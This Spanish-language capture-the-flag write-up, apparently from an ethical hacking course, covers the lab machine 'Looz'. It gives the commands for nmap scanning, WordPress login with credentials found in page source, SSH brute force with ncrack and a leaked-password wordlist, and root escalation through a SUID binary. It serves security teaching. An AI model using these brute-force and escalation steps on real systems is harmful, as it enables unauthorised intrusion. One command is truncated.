---
title: "🖥️ Máquina: Looz — Hacking Ético"
aliases:
  - Looz
  - Máquina Looz
  - VM Looz
  - Writeup Looz
tags:
  - ifct0109
  - hacking-etico
  - vms
  - linux
  - ctf
---

# 🖥️ Máquina: Looz

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Dificultad:** Conceptos Básicos  
> **Técnicas trabajadas:** WEB Attack · Enumeración · Brute Force · Escalada de privilegios  
> **Descripción:** En este laboratorio practicaremos enumeración web, descubrimiento de credenciales en el código fuente, fuerza bruta de login por SSH y escalada de privilegios mediante un binario con permisos SUID.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.7`
* **`RHOST` (Víctima / Looz):** Ej. `10.0.0.10`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Looz tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Escaneo de red

```bash
nmap -sT -p- 10.0.0.10
```

```bash
nmap -A -p22,80,3306,8081 10.0.0.10
```

> [!info] Resultado
> Observamos servicios web (nginx, Apache en 8081), MySQL y SSH abiertos.

---

## 🌐 Fase 2: Enumeración web

Accedemos a la web principal y revisamos el código fuente:

> [!info] Resultado
> <!-- Comentario con credencial de acceso encontrada -->

Añadimos el dominio al archivo /etc/hosts para resolver:

```bash
sudo sh -c
```

Ahora probamos el acceso a:

```bash
http://wp.looz.com/wp-admin
```

Usamos las credenciales encontradas en el código fuente para iniciar sesión en WordPress.

> [!info] Resultado
> Dentro vemos usuarios como john (admin) y gandalf.

---

## 🔐 Fase 3: Fuerza bruta SSH

Probamos fuerza bruta sobre gandalf con ncrack:

```bash
ncrack -u gandalf -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt ssh://10.0.0.10
```

Cuando se encuentre la contraseña correcta, iniciamos sesión por SSH:

```bash
ssh gandalf@10.0.0.10
```

---

## 🚀 Fase 4: Escalada de privilegios

Buscamos binarios con SUID:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Entre los resultados aparece un binario sospechoso en la carpeta de otro usuario.

```bash
/home/alatar/Private/shell_testv1.0
```

Al ejecutarlo conseguimos una shell como root.

```bash
id
```

```bash
cat /root/root.txt
```

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
